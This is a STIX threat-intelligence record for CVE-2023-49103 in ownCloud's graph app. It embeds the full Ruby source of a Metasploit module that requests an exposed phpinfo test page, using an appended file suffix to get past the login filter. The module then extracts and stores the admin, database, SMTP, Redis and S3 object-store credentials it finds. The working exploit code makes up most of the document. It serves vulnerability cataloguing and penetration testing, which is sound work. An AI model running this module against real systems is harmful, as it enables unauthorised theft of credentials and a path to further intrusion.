{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8b26dfca-ecec-453d-8964-09a3335f2ee4",
    "created": "2024-08-14T16:32:07.621556Z",
    "modified": "2024-08-14T16:32:07.62156Z",
    "name": "ownCloud Phpinfo Reader",
    "description": " Docker containers of ownCloud compiled after February 2023, which have version 0.2.0 before 0.2.1 or 0.3.0 before 0.3.1 of the app `graph` installed",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/owncloud_phpinfo_reader.rb",
            "external_id": "owncloud_phpinfo_reader.rb"
        },
        {
            "source_name": "reference",
            "url": "https://owncloud.com/security-advisories/disclosure-of-sensitive-credentials-and-configuration-in-containerized-deployments/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/creacitysec/CVE-2023-49103"
        },
        {
            "source_name": "reference",
            "url": "https://www.labs.greynoise.io//grimoire/2023-11-29-owncloud-redux/"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2023/12/01/etr-cve-2023-49103-critical-information-disclosure-in-owncloud-graph-api/"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-49103"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'ownCloud Phpinfo Reader',\n        'Description' => %q{\n          Docker containers of ownCloud compiled after February 2023, which have version 0.2.0 before 0.2.1 or 0.3.0 before 0.3.1 of the app `graph` installed\n          contain a test file which prints `phpinfo()` to an unauthenticated user. A post file name must be appended to the URL to bypass the login filter.\n          Docker may export sensitive environment variables including ownCloud, DB, redis, SMTP, and S3 credentials, as well as other host information.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die', # msf module\n          'creacitysec', # original PoC\n          'Ron Bowes', # research\n          'random-robbie', # additional PoC work and research\n          'Christian Fischer' # additional PoC work and research\n        ],\n        'References' => [\n          [ 'URL', 'https://owncloud.com/security-advisories/disclosure-of-sensitive-credentials-and-configuration-in-containerized-deployments/'],\n          [ 'URL', 'https://github.com/creacitysec/CVE-2023-49103'],\n          [ 'URL', 'https://www.labs.greynoise.io//grimoire/2023-11-29-owncloud-redux/'],\n          [ 'URL', 'https://www.rapid7.com/blog/post/2023/12/01/etr-cve-2023-49103-critical-information-disclosure-in-owncloud-graph-api/'],\n          [ 'CVE', '2023-49103']\n        ],\n        'Targets' => [\n          [ 'Automatic Target', {}]\n        ],\n        'DisclosureDate' => '2023-11-21',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => [IOC_IN_LOGS]\n        }\n      )\n    )\n    register_options(\n      [\n        Opt::RPORT(8080),\n        OptString.new('TARGETURI', [ true, 'The URI of ownCloud', '/']),\n        OptEnum.new('ROOT', [true, 'Root path to start with', 'all', ['all', '', 'owncloud'] ]),\n        OptEnum.new('ENDFILE', [\n          true, 'End path to append', 'all', [\n            'all', 'css', 'js', 'svg', 'gif', 'png', 'html', 'ttf', 'woff', 'ico', 'jpg',\n            'jpeg', 'json', 'properties', 'min.map', 'js.map', 'auto.map'\n          ]\n        ]),\n      ]\n    )\n  end\n\n  def roots\n    if datastore['ROOT'] == 'all'\n      return ['', 'owncloud']\n    end\n\n    datastore['ROOT']\n  end\n\n  def endfiles\n    if datastore['ENDFILE'] == 'all'\n      return [\n        '.css', '.js', '.svg', '.gif', '.png', '.html', '.ttf', '.woff', '.ico', '.jpg',\n        '.jpeg', '.json', '.properties', '.min.map', '.js.map', '.auto.map'\n      ]\n    end\n    \".#{datastore['ENDFILE']}\"\n  end\n\n  def field_regex(field)\n    \"<tr><td class=\\\"e\\\">#{field} <\\/td><td class=\\\"v\\\">([^ ]+) <\\/td><\\/tr>\"\n  end\n\n  def get_mappings\n    {\n      'License Key' => 'OWNCLOUD_LICENSE_KEY',\n      'Hostname' => 'HOSTNAME',\n      'Home' => 'HOME',\n      'Server Root' => 'APACHE_DOCUMENT_ROOT',\n      'PWD' => 'PWD',\n      'SMTP Host' => 'OWNCLOUD_MAIL_SMTP_HOST',\n      'SMTP Port' => 'OWNCLOUD_MAIL_SMTP_PORT',\n      'SMTP Username' => 'OWNCLOUD_MAIL_SMTP_NAME',\n      'SMTP Password' => 'OWNCLOUD_MAIL_SMTP_PASSWORD',\n      'ownCloud Username' => 'OWNCLOUD_ADMIN_USERNAME',\n      'ownCloud Password' => 'OWNCLOUD_ADMIN_PASSWORD',\n      'ownCloud Server Port' => 'SERVER_PORT',\n      'DB Host' => 'OWNCLOUD_DB_HOST',\n      'DB Username' => 'OWNCLOUD_DB_USERNAME',\n      'DB Password' => 'OWNCLOUD_DB_PASSWORD',\n      'DB Name' => 'OWNCLOUD_DB_NAME',\n      'DB Type' => 'OWNCLOUD_DB_TYPE',\n      'Redis Host' => 'OWNCLOUD_REDIS_HOST',\n      'Redis Port' => 'OWNCLOUD_REDIS_PORT',\n      'Redis DB' => 'OWNCLOUD_REDIS_DB',\n      'Redis Password' => 'OWNCLOUD_REDIS_PASSWORD',\n      'ObjectStore Endpoint' => 'OWNCLOUD_OBJECTSTORE_ENDPOINT',\n      'ObjectStore Region' => 'OWNCLOUD_OBJECTSTORE_REGION',\n      'ObjectStore Secret' => 'OWNCLOUD_OBJECTSTORE_SECRET',\n      'ObjectStore Key' => 'OWNCLOUD_OBJECTSTORE_KEY',\n      'ObjectStore Bucket' => 'OWNCLOUD_OBJECTSTORE_BUCKET'\n    }\n  end\n\n  def run\n    found = false\n    roots.each do |root|\n      break if found\n\n      endfiles.each do |endfile|\n        url = normalize_uri(target_uri.path, root, 'apps', 'graphapi', 'vendor', 'microsoft', 'microsoft-graph', 'tests', 'GetPhpInfo.php', endfile)\n        vprint_status(\"Checking: #{url}\")\n        res = send_request_cgi(\n          'uri' => url\n        )\n\n        fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n        unless res.code == 200 && res.body.include?('phpinfo()')\n          print_bad(\"Not Exploited - HTTP Status Code: #{res.code}\")\n          next\n        end\n        print_good(\"Found phpinfo page at: #{url}\")\n\n        # store page\n        l = store_loot(\n          'owncloud.phpinfo',\n          'text/html',\n          rhost,\n          res.body,\n          'phpinfo.html'\n        )\n        print_good(\"Loot stored to: #{l}\")\n\n        # process the page\n        mappings = get_mappings\n        extracted_values = {}\n        mappings.each do |field_name, field|\n          if res.body =~ /#{field_regex(field)}/\n            extracted_values[field_name] = ::Regexp.last_match(1)\n            print_good(\"#{field_name}: #{extracted_values[field_name]}\")\n          end\n        end\n\n        table = Rex::Text::Table.new(\n          'Header' => 'Credentials',\n          'Indent' => 2,\n          'SortIndex' => 0,\n          'Columns' => [ 'Type', 'Host', 'Username', 'Password', 'Notes']\n        )\n\n        if extracted_values['SMTP Password']\n          credential_data = {\n            protocol: 'tcp',\n            workspace_id: myworkspace_id,\n            service_name: 'SMTP',\n            origin_type: :service,\n            module_fullname: fullname,\n            status: Metasploit::Model::Login::Status::UNTRIED,\n            private_data: extracted_values['SMTP Password'],\n            private_type: :password\n          }\n          credential_data[:username] = extracted_values['SMTP Username'] if extracted_values['SMTP Username']\n          credential_data[:address] = extracted_values['SMTP Host'].nil? ? '127.0.0.1' : extracted_values['SMTP Host']\n          credential_data[:port] = extracted_values['SMTP Port'].nil? ? 25 : extracted_values['SMTP Port']\n\n          create_credential(credential_data)\n          table << ['SMTP', \"#{credential_data[:address]}:#{credential_data[:port]}\", credential_data[:username], extracted_values['SMTP Password'], '']\n        end\n\n        if extracted_values['ownCloud Password']\n          credential_data = {\n            protocol: 'tcp',\n            port: rport,\n            address: rhost,\n            workspace_id: myworkspace_id,\n            service_name: 'ownCloud',\n            origin_type: :service,\n            module_fullname: fullname,\n            status: Metasploit::Model::Login::Status::UNTRIED,\n            private_data: extracted_values['ownCloud Password'],\n            private_type: :password\n          }\n          credential_data[:username] = extracted_values['ownCloud Username'].nil? ? '' : extracted_values['ownCloud Username']\n\n          create_credential(credential_data)\n          table << ['ownCloud', \"#{rhost}:#{rport}\", credential_data[:username], extracted_values['ownCloud Password'], '']\n        end\n\n        ## DB\n        if extracted_values['DB Password']\n          credential_data = {\n            protocol: 'tcp',\n            port: extracted_values['DB Host'].split(':')[1],\n            address: extracted_values['DB Host'].split(':')[0],\n            workspace_id: myworkspace_id,\n            service_name: extracted_values['DB Type'],\n            origin_type: :service,\n            module_fullname: fullname,\n            status: Metasploit::Model::Login::Status::UNTRIED,\n            private_data: datastore['DB Password'],\n            private_type: :password\n          }\n          credential_data[:username] = extracted_values['DB Password'].nil? ? '' : extracted_values['DB Username']\n          create_credential(credential_data)\n          table << [extracted_values['DB Type'], \"#{rhost}:#{rport}\", credential_data[:username], extracted_values['DB Password'], '']\n        end\n\n        ## REDIS\n        if extracted_values['Redis Password']\n          credential_data = {\n            protocol: 'tcp',\n            port: extracted_values['Redis Host'],\n            address: extracted_values['Redis Port'],\n            workspace_id: myworkspace_id,\n            service_name: 'redis',\n            origin_type: :service,\n            module_fullname: fullname,\n            status: Metasploit::Model::Login::Status::UNTRIED,\n            private_data: extracted_values['Redis Password'],\n            private_type: :password\n          }\n\n          create_credential(credential_data)\n          table << ['redis', \"#{extracted_values['Redis Host']}:#{extracted_values['Redis Port']}\", '', extracted_values['Redis Password'], '']\n        end\n\n        ## OBJECTSTORE\n        if extracted_values['ObjectStore Secret'] && extracted_values['ObjectStore Key']\n          table << ['S3 Object Store', extracted_values['ObjectStore Region'], \"Key: #{extracted_values['ObjectStore Key']}\", \"Secret: #{extracted_values['ObjectStore Secret']}\", \"Endpoint: #{extracted_values['ObjectStore Endpoint']}, Bucket: #{extracted_values['ObjectStore Bucket']}\"]\n        end\n\n        print_good(table.to_s)\n        found = true\n        break # no need to keep going, we already got what we wanted\n      end\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2023-11-21"
}